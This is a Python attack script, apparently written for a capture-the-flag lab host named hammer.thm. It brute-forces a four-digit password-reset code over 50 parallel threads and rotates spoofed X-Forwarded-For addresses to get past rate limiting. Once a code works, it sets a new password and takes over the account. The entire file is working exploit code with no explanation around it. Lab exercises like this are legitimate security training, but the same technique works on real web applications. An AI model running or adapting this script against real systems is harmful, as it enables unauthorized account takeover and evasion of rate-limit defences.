import requests
import urllib3
import random
import time
from random import randint, choice
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress SSL warnings  (Not useful Here, just good to know)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target setup
base_url = "http://hammer.thm:1337/reset_password.php"
email = "tester@hammer.thm"
new_password = "MySecureP@ssw0rd"
code_range = range(10000)  # Brute-force range
max_threads = 50  # Try up to 50 parallel threads

# Generate random IPs for obfuscation
def random_ip():
    return f"{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"

ip_list = [random_ip() for _ in range(1000)]

# Worker function for each thread
def try_code(code):
    try:
        s = requests.Session()
        s.get(base_url)  # Get session + cookie
        s.post(base_url, data={"email": email})  # Request recovery

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "X-Forwarded-For": choice(ip_list),
            "Accept-Language": "en-US,en;q=0.9",
        }

        # Try recovery code
        response = s.post(base_url, data={"recovery_code": f"{code:04d}", "s": "9999999"},
                          headers=headers, allow_redirects=True)

        if "Invalid or expired" not in response.text:
            print(f"[✓] Found code: {code:04d}")

            # Try changing password
            password_url = response.url
            data3 = {
                "new_password": new_password,
                "confirm_password": new_password
            }
            response_pw = s.post(password_url, data=data3, headers=headers, allow_redirects=True)

            if "Password" in response_pw.text or response_pw.status_code == 200:
                print(f"[✓] Password changed to: {new_password}")
                print(response_pw.text[:300])  # Preview response
                return True

    except Exception as e:
        print(f"[!] Error with code {code:04d}: {e}")

    return False

# Start timer
start = time.time()

# Use a ThreadPoolExecutor to run multiple threads concurrently
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    
    # Submit all codes to the thread pool. Each code will be tested in parallel.
    future_to_code = {
        executor.submit(try_code, code): code
        for code in code_range
    }

    # As each thread completes, handle its result
    for future in as_completed(future_to_code):
        success = future.result()  # Get the result of try_code(code)

        if success:  # If the correct code is found
            print(f"Completed in {time.time() - start:.2f} seconds.")
            
            # Stop all other threads immediately
            executor.shutdown(wait=False, cancel_futures=True)
            break
    else:
        # This runs if no correct code is found in the entire range
        print("No valid code found in given range.")
